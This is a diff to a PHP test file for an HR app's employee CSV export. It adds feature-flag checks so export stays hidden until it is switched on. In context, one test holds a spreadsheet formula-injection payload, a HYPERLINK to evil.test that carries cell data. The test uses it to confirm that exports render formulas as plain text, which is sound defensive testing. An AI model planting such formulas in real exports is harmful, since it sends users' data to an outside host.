@@ -151,6 +151,11 @@ it('offers a template whose headers map every field automatically and whose exam
 });
 
 it('exports the listed employees in the template format, and the edited file comes back as updates', function () {
+    // Export is switched apart from import (owner, 2026-11-26): import alone shows no Export button.
+    Livewire::test(ListEmployees::class)->assertActionHidden('exportEmployees');
+    expect(fn () => app(EmployeeImports::class)->export(Employee::query(), $this->hr))->toThrow(RuntimeException::class, 'Employee export is not switched on');
+    app(FeatureFlags::class)->setForTenant($this->tenant, EmployeeImports::EXPORT_FEATURE, true, platformAdmin(), 'Export agreed');
+
     Livewire::test(ListEmployees::class)->callAction('exportEmployees')->assertFileDownloaded('employees-2026-09-21.csv');
 
     $csv = app(EmployeeImports::class)->export(Employee::query(), $this->hr);
@@ -254,6 +259,7 @@ it('keeps review decisions inside the chosen mode', function () {
 it('exports a value a spreadsheet would run as a formula as plain text, and reads it back exactly when re-imported', function () {
     $formula = '=HYPERLINK("https://evil.test/?"&B2,"Bhavna")';
     $this->boss->person->forceFill(['middle_name' => $formula])->save();
+    app(FeatureFlags::class)->setForTenant($this->tenant, EmployeeImports::EXPORT_FEATURE, true, platformAdmin(), 'Export agreed');
 
     $csv = app(EmployeeImports::class)->export(Employee::query(), $this->hr);
     $exported = str_getcsv(explode("\n", trim($csv))[1], escape: '');
